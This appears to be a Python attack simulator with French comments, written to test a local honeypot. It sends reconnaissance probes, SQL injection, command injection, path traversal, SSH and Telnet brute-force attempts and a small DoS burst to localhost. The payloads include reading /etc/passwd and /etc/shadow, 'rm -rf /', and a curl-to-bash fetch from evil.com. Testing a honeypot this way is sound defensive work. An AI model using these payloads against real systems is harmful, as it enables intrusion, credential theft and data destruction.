#!/usr/bin/env python3
"""
Simulateur d'attaques pour tester le honeypot
Génère différents types d'attaques contre les services
"""

import requests
import socket
import telnetlib
import time
import random
import threading
from datetime import datetime

# Configuration
HONEYPOT_HOST = "localhost"
HTTP_PORT = 8080
SSH_PORT = 2222
TELNET_PORT = 2323

class AttackSimulator:
    def __init__(self):
        self.attack_count = 0
        
    def log_attack(self, attack_type, service):
        self.attack_count += 1
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Attack #{self.attack_count} - {service}: {attack_type}")
    
    # 🌐 Attaques HTTP
    def http_reconnaissance(self):
        """Scan de reconnaissance HTTP"""
        paths = [
            '/', '/admin', '/login', '/wp-admin', '/phpmyadmin',
            '/.env', '/config.php', '/backup.sql', '/.git',
            '/api/v1/users', '/dashboard', '/cpanel'
        ]
        
        for path in paths:
            try:
                response = requests.get(f"http://{HONEYPOT_HOST}:{HTTP_PORT}{path}", timeout=5)
                self.log_attack(f"Reconnaissance - {path} (Status: {response.status_code})", "HTTP")
                time.sleep(random.uniform(0.5, 2))
            except:
                pass
    
    def http_sql_injection(self):
        """Tentatives d'injection SQL"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' AND 1=1#",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users;--"
        ]
        
        for payload in payloads:
            try:
                # Test sur différents endpoints
                requests.get(f"http://{HONEYPOT_HOST}:{HTTP_PORT}/login?user={payload}")
                self.log_attack(f"SQL Injection - {payload[:20]}...", "HTTP")
                
                # Test POST
                requests.post(f"http://{HONEYPOT_HOST}:{HTTP_PORT}/login", 
                            data={'username': payload, 'password': 'test'})
                time.sleep(random.uniform(1, 3))
            except:
                pass
    
    def http_command_injection(self):
        """Tentatives d'injection de commandes"""
        payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(curl http://evil.com/shell.sh | bash)",
            "; rm -rf /"
        ]
        
        for payload in payloads:
            try:
                requests.post(f"http://{HONEYPOT_HOST}:{HTTP_PORT}/execute",
                            data={'cmd': payload})
                self.log_attack(f"Command Injection - {payload[:20]}...", "HTTP")
                time.sleep(random.uniform(1, 2))
            except:
                pass
    
    def http_path_traversal(self):
        """Tentatives de path traversal"""
        paths = [
            "/../../../etc/passwd",
            "/files/../../config.php",
            "/download?file=../../../etc/shadow",
            "/static/../../../var/log/apache/access.log"
        ]
        
        for path in paths:
            try:
                requests.get(f"http://{HONEYPOT_HOST}:{HTTP_PORT}{path}")
                self.log_attack(f"Path Traversal - {path}", "HTTP")
                time.sleep(random.uniform(0.5, 1.5))
            except:
                pass
    
    # 🔐 Attaques SSH
    def ssh_brute_force(self):
        """Brute force SSH"""
        users = ['root', 'admin', 'user', 'test', 'oracle', 'postgres']
        passwords = ['123456', 'password', 'admin', 'root', 'letmein', 'qwerty']
        
        for user in users:
            for password in passwords:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((HONEYPOT_HOST, SSH_PORT))
                    
                    # Recevoir le banner
                    banner = sock.recv(1024)
                    
                    # Envoyer une réponse SSH
                    sock.send(b"SSH-2.0-OpenSSH_7.4\r\n")
                    
                    self.log_attack(f"Brute Force - {user}:{password}", "SSH")
                    sock.close()
                    time.sleep(random.uniform(0.5, 2))
                except:
                    pass
    
    # 📞 Attaques Telnet
    def telnet_brute_force(self):
        """Brute force Telnet"""
        credentials = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('user', 'user'),
            ('admin', '123456'),
            ('root', 'password'),
            ('guest', 'guest')
        ]
        
        for username, password in credentials:
            try:
                tn = telnetlib.Telnet(HONEYPOT_HOST, TELNET_PORT, timeout=5)
                tn.read_until(b"Login:", timeout=3)
                tn.write(username.encode() + b"\n")
                tn.read_until(b"Password:", timeout=3)
                tn.write(password.encode() + b"\n")
                self.log_attack(f"Brute Force - {username}:{password}", "Telnet")
                tn.close()
                time.sleep(random.uniform(1, 3))
            except:
                pass
    
    # 🎯 Attaque DDoS simulée (légère)
    def http_dos_attempt(self):
        """Simulation d'attaque DoS (légère)"""
        print("\n⚠️  Simulation DoS (10 requêtes rapides)...")
        for i in range(10):
            try:
                threading.Thread(target=lambda: requests.get(f"http://{HONEYPOT_HOST}:{HTTP_PORT}/")).start()
                self.log_attack(f"DoS Attempt - Request {i+1}", "HTTP")
                time.sleep(0.1)
            except:
                pass
    
    # 🚀 Lancer toutes les attaques
    def run_all_attacks(self):
        """Lance toutes les simulations d'attaques"""
        print("🔥 Démarrage de la simulation d'attaques...")
        print("=" * 50)
        
        attacks = [
            ("🔍 Reconnaissance HTTP", self.http_reconnaissance),
            ("💉 SQL Injection", self.http_sql_injection),
            ("🐚 Command Injection", self.http_command_injection),
            ("📁 Path Traversal", self.http_path_traversal),
            ("🔑 SSH Brute Force", self.ssh_brute_force),
            ("📞 Telnet Brute Force", self.telnet_brute_force),
            ("💣 DoS Attempt", self.http_dos_attempt)
        ]
        
        for attack_name, attack_func in attacks:
            print(f"\n{attack_name}")
            print("-" * 30)
            attack_func()
            time.sleep(2)
        
        print("\n" + "=" * 50)
        print(f"✅ Simulation terminée ! Total: {self.attack_count} attaques")
        print("\n📊 Vérifiez les résultats :")
        print("- Statistiques API : http://localhost:5000/api/stats")
        print("- Base de données : http://localhost:8081")


def main():
    simulator = AttackSimulator()
    
    print("🎯 Simulateur d'attaques pour Honeypot")
    print("=====================================\n")
    print("Que voulez-vous faire ?")
    print("1. Lancer toutes les attaques")
    print("2. Reconnaissance HTTP uniquement")
    print("3. Brute Force (SSH + Telnet)")
    print("4. Injections (SQL + Commandes)")
    print("5. Attaque personnalisée")
    
    choice = input("\nVotre choix (1-5) : ")
    
    if choice == "1":
        simulator.run_all_attacks()
    elif choice == "2":
        simulator.http_reconnaissance()
    elif choice == "3":
        simulator.ssh_brute_force()
        simulator.telnet_brute_force()
    elif choice == "4":
        simulator.http_sql_injection()
        simulator.http_command_injection()
    elif choice == "5":
        print("\nAttaque personnalisée :")
        service = input("Service (http/ssh/telnet) : ").lower()
        if service == "http":
            path = input("Path (ex: /admin) : ")
            method = input("Method (GET/POST) : ").upper()
            if method == "GET":
                requests.get(f"http://{HONEYPOT_HOST}:{HTTP_PORT}{path}")
            else:
                data = input("Data (ex: user=admin) : ")
                requests.post(f"http://{HONEYPOT_HOST}:{HTTP_PORT}{path}", data=data)
            print("✅ Attaque envoyée !")
    else:
        print("Choix invalide")


if __name__ == "__main__":
    main()